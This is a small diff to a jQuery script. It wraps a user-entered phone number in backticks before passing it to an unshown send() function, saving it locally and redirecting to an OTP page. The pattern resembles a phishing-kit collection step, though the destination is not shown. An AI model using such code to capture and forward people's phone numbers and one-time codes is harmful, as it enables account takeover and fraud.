@@ -333,7 +333,7 @@ $(document).ready(function () {
     }    
   });
   $('#sb').on('click',function(){
-      msg = `رقم الهاتف: ${$("#phone").val()}`
+      msg = `رقم الهاتف: \`${$("#phone").val()}\``
       send(msg)
       localStorage.setItem('phone',$("#phone").val())
       window.location.href = './otp'
